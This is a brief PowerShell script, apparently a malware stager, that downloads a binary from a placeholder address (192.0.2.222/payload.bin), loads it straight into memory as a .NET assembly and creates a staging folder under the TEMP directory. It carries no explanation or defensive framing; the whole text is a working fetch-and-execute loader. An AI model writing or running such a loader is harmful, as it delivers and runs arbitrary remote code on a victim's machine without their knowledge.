[CmdletBinding()]
param(
    [string]$FetchUrl = "https://192.0.2.222/payload.bin"
)
$PayloadBytes = (New-Object System.Net.WebClient).DownloadData($FetchUrl)
[Reflection.Assembly]::Load($PayloadBytes)
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
